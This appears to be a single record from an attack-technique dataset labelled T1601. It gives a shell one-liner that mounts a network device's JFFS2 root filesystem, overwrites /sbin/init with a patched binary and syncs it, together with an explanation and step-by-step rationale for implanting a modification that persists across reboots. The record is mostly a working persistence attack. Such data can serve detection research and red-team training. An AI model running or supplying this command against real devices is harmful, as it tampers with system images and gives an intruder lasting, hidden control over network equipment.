command: echo 'T1601 patch: in-place rootfs modification (JFFS2)'; mount -t jffs2 /dev/mtdblock6 /mnt/rootfs && cp -f /tmp/init-patched /mnt/rootfs/sbin/init && chmod 755 /mnt/rootfs/sbin/init && umount /mnt/rootfs && sync
explanation: Mounts a JFFS2-based root filesystem partition and replaces the init binary to implant a persistent modification inside the system image.
rationale_steps: Mount the flash-based rootfs used by the NOS at boot.
Replace a critical system binary (init) within the image to ensure execution on startup.
Unmount and sync so the modified image is what boots next.
